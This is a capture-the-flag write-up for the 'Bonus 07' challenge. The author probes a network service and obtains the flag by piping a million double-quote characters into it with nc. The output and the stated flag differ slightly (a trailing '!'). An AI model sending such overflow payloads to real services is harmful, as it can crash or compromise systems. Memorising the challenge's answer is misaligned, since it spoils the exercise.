# Bonus 07

The network service at target.xxxxxxx.co on port 9007 can be attacked. This is similar to another service this developer built, but they learned their lessons and worked on securing the service. Security scans tell us there is still an overflow condition but this will be much more difficult.

## Solution

For this one, the error message on startup `The request is not completed, expected"` gave me a hint. I overloaded the server with 1000000 `"` and managed to get the flag. \o/

```
# Raw test
$ telnet target.xxxxxxx.co 9007
Escape character is '^]'.
Processing request from server.
Query is not terminated, expected "
HelloWorld!
Input did not resolve exception. Terminating.
Connection closed by foreign host.

$ (printf '%0.s"' {1..1000000}; printf '\n') | nc target.xxxxxxx.co 9007
Processing request from server.
Query is not terminated, expected "
Query terminated correctly.
Specific0verfl0WiSSp3cif1c
```

Flag is `Specific0verfl0WiSSp3cif1c!`
